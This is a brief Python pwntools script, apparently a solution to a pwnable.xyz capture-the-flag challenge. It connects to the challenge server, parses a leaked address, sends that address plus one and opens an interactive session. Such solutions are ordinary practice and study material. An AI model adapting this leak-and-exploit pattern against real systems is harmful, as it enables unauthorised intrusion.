from pwn import *

r = remote('svc.pwnable.xyz',30000)

r.recvline()

leak = int(r.recvline().split('Leak: ')[-1],16)
r.sendline('{}\n'.format(leak + 1))
r.interactive()


